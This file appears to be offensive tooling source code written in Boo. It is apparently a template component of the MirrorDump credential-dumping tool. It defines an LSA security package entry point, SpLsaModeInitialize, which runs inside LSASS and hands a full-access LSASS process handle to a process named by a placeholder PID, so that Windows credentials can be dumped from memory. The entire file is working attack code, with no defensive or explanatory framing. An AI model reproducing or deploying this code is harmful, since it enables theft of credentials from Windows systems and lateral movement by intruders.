from System import IntPtr
import System.Reflection
import System.Runtime.InteropServices
import MirrorDump

[DllImport("kernel32.dll")]
def DuplicateHandle(sourceProcess as IntPtr, sourceHandle as IntPtr, targetProcess as IntPtr, ref targetHandle as IntPtr, 
	desiredAccess as uint, inherit as bool, options as uint) as bool:
	pass

[DllImport("kernel32.dll")]
def OpenProcess(processAccess as uint, inherit as bool, processId as int) as IntPtr:
	pass

[DllImport("kernel32.dll")]
def GetCurrentProcess() as IntPtr:
	pass

[DllImport("kernel32.dll")]
def CloseHandle(hObject as IntPtr) as bool:
	pass

[DllExport]
def SpLsaModeInitialize(LsaVersion as int, PackageVersion as IntPtr, ppTables as IntPtr, pcTables as IntPtr) as int:	

	Marshal.WriteInt32(PackageVersion, 1);
	Marshal.WriteInt32(pcTables, 0);
	Marshal.WriteIntPtr(ppTables, IntPtr.Zero)
	
	handle = OpenProcess(0x40, true, {0})
	targetHandle = IntPtr.Zero
	DuplicateHandle(GetCurrentProcess(),GetCurrentProcess(), handle, targetHandle, 0x1F0FFF, false, 1)
	CloseHandle(handle)

	return 0